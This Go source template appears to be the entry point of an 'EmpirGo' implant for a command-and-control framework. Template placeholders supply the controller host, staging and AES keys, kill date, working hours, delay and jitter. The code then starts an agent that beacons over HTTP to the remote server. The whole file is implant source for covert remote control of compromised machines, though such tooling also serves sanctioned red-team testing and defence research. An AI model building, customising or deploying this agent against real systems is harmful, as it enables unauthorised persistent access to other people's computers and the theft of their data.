package main

import (
	"EmpirGo/agent"
	"EmpirGo/comms"
	"encoding/base64"
	"fmt"
)

func main() {
	profile := "{{ PROFILE }}"
	server := "{{ HOST }}"
	sessionID := "{{ SESSION_ID }}"
	killDate := "{{ KILL_DATE }}"
	workingHours := "{{ WORKING_HOURS }}"
	delay := {{ DELAY }}
	jitter := {{ JITTER }}
	lostLimit := {{ LOST_LIMIT }}
    stagingKeyBase64 := "{{ STAGING_KEY | safe }}"
	aesKeyBase64 := "{{ AES_KEY | safe }}"
	defaultResponse := "{{ DEFAULT_RESPONSE }}"

	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
	if err != nil {
		fmt.Println("Error decoding stagingKey:", err)
		return
	}

	aeskey, err := base64.StdEncoding.DecodeString(aesKeyBase64)
	if err != nil {
		fmt.Println("Error decoding aeskey:", err)
		return
	}

	packetHandler := comms.PacketHandler{
		MissedCheckins: 0,
		Server:         server,
		StagingKey:     stagingKey,
		Aeskey:         aeskey,
	}

	messagesender, err := comms.NewHttpMessageSender(server, make(map[string]string), profile)

	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, stagingKey, defaultResponse)

	go newAgent.Run()

	select {}
}
